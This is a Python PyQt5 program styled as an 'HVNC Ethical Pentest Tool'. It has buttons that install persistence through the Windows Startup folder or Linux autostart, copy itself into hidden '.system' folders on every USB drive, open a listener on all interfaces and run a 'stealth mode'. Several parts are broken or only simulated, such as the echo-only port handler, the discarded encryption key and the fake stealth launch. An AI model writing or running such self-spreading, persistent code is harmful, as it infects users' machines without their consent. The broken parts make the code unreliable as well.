import sys
import os
import socket
import shutil
import subprocess
import threading
import time
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
from PyQt5.QtWidgets import (QApplication, QMainWindow, QPushButton, QVBoxLayout, QWidget, QTextEdit, QLabel, QLineEdit, QHBoxLayout, QMessageBox, QCheckBox, QScrollArea, QTabWidget, QTableWidget, QTableWidgetItem)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer

class NetworkScanner(QThread):
    update_signal = pyqtSignal(str)

    def run(self):
        try:
            public_ip = requests.get("https://ifconfig.me").text.strip()
            local_ip = socket.gethostbyname(socket.gethostname())
            self.update_signal.emit(f"Public IP: {public_ip}\nLocal IP: {local_ip}")
        except Exception as e:
            self.update_signal.emit(f"Error detecting network: {e}")

class LiveMonitorThread(QThread):
    update_signal = pyqtSignal(list, list)

    def run(self):
        while True:
            connections = []
            usb_devices = []
            
            # Check for open TCP connections (simulate)
            try:
                connections.append(("127.0.0.1", "5900"))
            except Exception:
                pass

            # Check for USB devices
            try:
                usb_path = "/media" if os.name != 'nt' else "D:\\"
                for root, dirs, files in os.walk(usb_path):
                    for dir in dirs:
                        usb_devices.append(dir)
                        break
            except Exception:
                pass

            self.update_signal.emit(connections, usb_devices)
            time.sleep(3)

class HVNCTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("HVNC Ethical Pentest Tool")
        self.setGeometry(200, 100, 1000, 700)
        self.initUI()

    def initUI(self):
        self.tabs = QTabWidget()

        self.control_tab = QWidget()
        self.monitor_tab = QWidget()

        self.tabs.addTab(self.control_tab, "Control Center")
        self.tabs.addTab(self.monitor_tab, "Live Monitor")

        self.initControlTab()
        self.initMonitorTab()

        self.setCentralWidget(self.tabs)

        # Start network detection
        self.detect_network()

    def initControlTab(self):
        layout = QVBoxLayout()

        self.output = QTextEdit()
        self.output.setReadOnly(True)

        self.local_ip_label = QLabel("Local IP: Not Detected")
        self.public_ip_label = QLabel("Public IP: Not Detected")

        self.port_input = QLineEdit()
        self.port_input.setPlaceholderText("Enter port to forward (default 5900)")

        self.start_hvnc_button = QPushButton("Start HVNC")
        self.forward_button = QPushButton("Start Port Forwarding")
        self.encrypt_button = QPushButton("Encrypt Payload")
        self.persist_button = QPushButton("Enable Persistence")
        self.spread_button = QPushButton("Enable Self-Spreading")
        self.stealth_button = QPushButton("Activate Stealth Mode")

        self.persistence_checkbox = QCheckBox("Persistence")
        self.spread_checkbox = QCheckBox("Self-Spreading")
        self.encryption_checkbox = QCheckBox("Encrypt Communications")
        self.stealth_checkbox = QCheckBox("Stealth Processes")

        # Connect buttons
        self.start_hvnc_button.clicked.connect(self.start_hvnc)
        self.forward_button.clicked.connect(self.start_port_forwarding)
        self.encrypt_button.clicked.connect(self.encrypt_payload)
        self.persist_button.clicked.connect(self.enable_persistence)
        self.spread_button.clicked.connect(self.enable_self_spread)
        self.stealth_button.clicked.connect(self.activate_stealth)

        layout.addWidget(self.local_ip_label)
        layout.addWidget(self.public_ip_label)
        layout.addWidget(self.port_input)
        layout.addWidget(self.start_hvnc_button)
        layout.addWidget(self.forward_button)
        layout.addWidget(self.encrypt_button)
        layout.addWidget(self.persist_button)
        layout.addWidget(self.spread_button)
        layout.addWidget(self.stealth_button)
        layout.addWidget(QLabel("Settings:"))
        layout.addWidget(self.persistence_checkbox)
        layout.addWidget(self.spread_checkbox)
        layout.addWidget(self.encryption_checkbox)
        layout.addWidget(self.stealth_checkbox)
        layout.addWidget(QLabel("Logs:"))
        layout.addWidget(self.output)

        self.control_tab.setLayout(layout)

    def initMonitorTab(self):
        layout = QVBoxLayout()

        self.connection_table = QTableWidget()
        self.connection_table.setColumnCount(2)
        self.connection_table.setHorizontalHeaderLabels(["Client IP", "Port"])

        self.usb_table = QTableWidget()
        self.usb_table.setColumnCount(1)
        self.usb_table.setHorizontalHeaderLabels(["USB Device"])

        layout.addWidget(QLabel("Active Connections:"))
        layout.addWidget(self.connection_table)
        layout.addWidget(QLabel("Detected USB Devices:"))
        layout.addWidget(self.usb_table)

        self.monitor_tab.setLayout(layout)

        self.monitor_thread = LiveMonitorThread()
        self.monitor_thread.update_signal.connect(self.update_monitor)
        self.monitor_thread.start()

    def update_monitor(self, connections, usb_devices):
        self.connection_table.setRowCount(len(connections))
        for row, (ip, port) in enumerate(connections):
            self.connection_table.setItem(row, 0, QTableWidgetItem(ip))
            self.connection_table.setItem(row, 1, QTableWidgetItem(str(port)))

        self.usb_table.setRowCount(len(usb_devices))
        for row, device in enumerate(usb_devices):
            self.usb_table.setItem(row, 0, QTableWidgetItem(device))

    def log(self, message):
        self.output.append(message)
        print(message)

    def detect_network(self):
        self.network_thread = NetworkScanner()
        self.network_thread.update_signal.connect(self.update_network_info)
        self.network_thread.start()

    def update_network_info(self, info):
        lines = info.split('\n')
        if len(lines) >= 2:
            self.public_ip_label.setText(lines[0])
            self.local_ip_label.setText(lines[1])
        self.log(info)

    def start_hvnc(self):
        subprocess.Popen(["tightvncserver", ":1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.log("[+] HVNC server started.")

    def start_port_forwarding(self):
        port = self.port_input.text()
        if not port:
            port = "5900"
        threading.Thread(target=self.port_forwarding_server, args=(int(port),)).start()

    def port_forwarding_server(self, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("0.0.0.0", port))
        server.listen(5)
        self.log(f"[+] Port forwarding started on {port}")
        while True:
            client_socket, addr = server.accept()
            self.log(f"[+] Connection received from {addr}")
            threading.Thread(target=self.handle_client, args=(client_socket,)).start()

    def handle_client(self, client_socket):
        while True:
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                client_socket.sendall(data)
            except Exception:
                break
        client_socket.close()

    def encrypt_payload(self):
        key = os.urandom(16)
        iv = b'1234567890abcdef'
        cipher = AES.new(key, AES.MODE_CBC, iv)
        data = b"Sensitive Payload Example"
        ciphertext = cipher.encrypt(pad(data, AES.block_size))
        with open("encrypted_payload.bin", "wb") as f:
            f.write(ciphertext)
        self.log("[+] Payload encrypted.")

    def enable_persistence(self):
        try:
            if os.name == 'nt':
                startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hvnc_tool.exe')
                shutil.copy(__file__, startup_path)
            else:
                startup_path = os.path.expanduser('~/.config/autostart/hvnc_tool.desktop')
                with open(startup_path, "w") as f:
                    f.write(f"[Desktop Entry]\nType=Application\nExec=python3 {os.path.abspath(__file__)}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=HVNC Tool\n")
            self.log("[+] Persistence enabled.")
        except Exception as e:
            self.log(f"[-] Persistence failed: {e}")

    def enable_self_spread(self):
        threading.Thread(target=self.self_spread_logic).start()

    def self_spread_logic(self):
        usb_path = "/media" if os.name != 'nt' else "D:\\"
        try:
            for root, dirs, files in os.walk(usb_path):
                for dir in dirs:
                    target_path = os.path.join(root, dir, ".system", "hvnc_tool.py")
                    os.makedirs(os.path.dirname(target_path), exist_ok=True)
                    shutil.copy(__file__, target_path)
                    self.log(f"[+] Spread to {target_path}")
        except Exception as e:
            self.log(f"[-] Self-spread failed: {e}")

    def activate_stealth(self):
        if os.name != 'nt':
            subprocess.Popen(["gnome-terminal", "--", "bash", "-c", "nohup explorer &"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            os.system("start /B svchost.exe")
        self.log("[+] Stealth mode activated.")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = HVNCTool()
    app.setStyleSheet("QWidget { background-color: #121212; color: #FFFFFF; } QPushButton { background-color: #1E1E1E; color: #00FF00; }")
    window.show()
    sys.exit(app.exec_())
